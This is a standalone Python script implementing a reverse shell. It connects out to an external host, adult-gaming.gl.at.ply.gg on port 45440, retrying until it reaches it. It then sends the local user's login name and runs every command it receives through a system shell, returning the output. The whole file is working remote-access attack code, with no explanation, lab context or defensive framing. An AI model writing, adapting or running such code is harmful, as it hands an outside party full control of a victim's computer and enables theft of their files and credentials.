import socket
import subprocess
import os
import time
login_name = os.getlogin()

def reverse_shell(host='adult-gaming.gl.at.ply.gg', port=45440):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            print(f"Connected to {host}:{port}")
            client_socket.send(login_name.encode())
            break  # Exit the loop if connection is successful
        except (ConnectionRefusedError,BrokenPipeError):

            print(f"Connection refused. Retrying in 5 seconds...")
            time.sleep(5)  # Wait before retrying

    current_dir = os.getcwd()

    while True:
        try:
            command = client_socket.recv(4096).decode()
            if not command:
                break
            if command.lower() == 'exit':
                break
            elif command.startswith("cd"):
                try:
                    new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    response = f'Changed directory to {current_dir}'
                except FileNotFoundError:
                    response = "Directory not found"
                except Exception as e:
                    response = str(e)
            else:
                try:
                    response = subprocess.check_output(command, shell=True, cwd=current_dir, stderr=subprocess.STDOUT)
                    response = response.decode()  # Decode bytes to string
                except subprocess.CalledProcessError as e:
                    response = e.output.decode()  # Decode bytes to string
                except Exception as e:
                    response = str(e)

            client_socket.send(response.encode())

        except (ConnectionResetError, BrokenPipeError) as e:
            print(f"Connection lost: {e}")
            # break
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            # break

    client_socket.close()
    print("Connection closed.")

if __name__ == "__main__":
    reverse_shell()
